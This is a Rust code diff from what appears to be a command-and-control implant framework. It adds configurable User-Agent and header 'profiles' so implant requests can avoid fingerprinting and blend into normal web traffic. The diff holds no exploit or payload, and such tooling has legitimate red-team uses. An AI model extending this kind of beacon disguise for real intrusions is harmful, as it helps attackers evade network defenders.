@@ -41,9 +41,15 @@ pub fn tls_roots(profile: &Profile) -> RootCertStore {
 /// the confidentiality), https under the profile's trust posture for the TLS
 /// front. A pinned bake with no CAs keeps the builder's default validation
 /// (the dev shape); the public posture always names the Mozilla set.
+///
+/// The baked User-Agent rides the agent itself so every dial presents it:
+/// set verbatim, empty included -- ureq's own default string is a
+/// fingerprint no baked profile asked for, and an empty value presents an
+/// empty header rather than the library's name.
 pub fn build_agent(url: &str, profile: &Profile, timeout_seconds: f64) -> ureq::Agent {
-    let mut builder =
-        ureq::AgentBuilder::new().timeout(Duration::from_secs_f64(timeout_seconds.max(1.0)));
+    let mut builder = ureq::AgentBuilder::new()
+        .timeout(Duration::from_secs_f64(timeout_seconds.max(1.0)))
+        .user_agent(&profile.user_agent);
     if url.starts_with("https://") {
         let roots = tls_roots(profile);
         if !roots.is_empty() {
@@ -58,6 +64,18 @@ pub fn build_agent(url: &str, profile: &Profile, timeout_seconds: f64) -> ureq::
         }
     }
     builder.build()
+}
+
+/// Applies the baked presentation headers onto a web request after the
+/// protocol's own Content-Type: the bake wins a name collision -- a headers
+/// entry is the profile's say over the request's shape, the malleable
+/// point. An entry named "User-Agent" likewise overrides the agent's baked
+/// user_agent.
+pub fn apply_headers(mut request: ureq::Request, profile: &Profile) -> ureq::Request {
+    for (name, value) in &profile.headers {
+        request = request.set(name, value);
+    }
+    request
 }
 
 /// One contact carriage: a way to hold a contact against one walked dial.
@@ -208,6 +226,8 @@ mod tests {
             jitter_seconds: 10.0,
             mode: "poll".into(),
             enroll_path: "/implants/enroll".into(),
+            user_agent: String::new(),
+            headers: Vec::new(),
             request_timeout_seconds: 30.0,
             envelope: "aesgcm".into(),
             contact_envelope: "none".into(),
